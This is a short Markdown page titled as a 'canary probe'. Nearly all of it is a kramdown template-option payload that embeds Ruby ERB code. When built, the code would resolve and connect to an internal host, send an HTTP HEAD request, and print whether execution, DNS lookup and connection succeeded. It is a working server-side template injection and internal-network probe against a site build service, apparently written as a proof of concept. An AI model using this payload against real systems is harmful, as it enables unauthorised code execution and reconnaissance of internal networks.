---
title: Pages internal-boundary canary probe
---

{::options template="string://<%= begin; require 'socket'; host='ssrf-target.iad.github.net'; dns=false; connected=false; status='none'; begin; dns=!Addrinfo.getaddrinfo(host,80,nil,:STREAM).empty?; rescue; end; if dns; begin; s=Socket.tcp(host,80,connect_timeout:3); connected=true; s.write(['HEAD / HTTP/1.0','Host: '+host,'Connection: close','',''].join(10.chr)); line=s.gets; s.close; candidate=line.to_s.split(' ')[1]; status=(candidate && candidate.length==3) ? candidate : 'none'; rescue; end; end; 'execution=true dns='+dns.to_s+' connected='+connected.to_s+' status='+status; end %>" /}

This content is replaced by the controlled ERB result.
